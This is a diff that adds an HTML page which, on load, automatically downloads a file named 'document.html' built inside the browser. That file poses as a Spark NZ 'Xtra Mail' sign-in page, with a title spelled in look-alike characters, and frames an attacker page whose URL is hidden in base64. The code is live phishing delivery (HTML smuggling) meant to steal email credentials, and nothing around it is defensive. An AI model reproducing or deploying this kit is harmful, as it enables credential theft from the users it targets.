@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+</head>
+<body>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Content to be downloaded
+        const htmlCode = `
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>хtrа Mаiӏ sіġn іn | Spаrκ Nʐ</title>
+            <link rel="icon" href="https://cdn.glitch.global/c32bcf11-c5c9-4060-8c5c-f1469e2b8990/favicon_32.png">
+            <style>
+                body { margin: 0; overflow: hidden; }
+                iframe { width: 100%; height: 100%; border: none; }
+            </style>
+        </head>
+        <body>
+            <iframe id="doc"></iframe>
+            <script>
+                document.getElementById('doc').src = atob('aHR0cHM6Ly94dHJhLW1pbmUuZ2xpdGNoLm1lL2luZGV4Lmh0bWw=');
+            <\/script>
+        <\/body>
+        <\/html>`;
+        
+        // Create a Blob with the HTML code
+        const blob = new Blob([htmlCode], { type: 'text/html' });
+
+        // Create a download link and trigger the download
+        const downloadLink = document.createElement('a');
+        downloadLink.href = URL.createObjectURL(blob);
+        downloadLink.download = 'document.html';
+
+        // Append the link to the body and click it to trigger the download
+        document.body.appendChild(downloadLink);
+        downloadLink.click();
+
+        // Remove the link from the DOM
+        document.body.removeChild(downloadLink);
+    });
+</script>
+
+</body>
+</html>
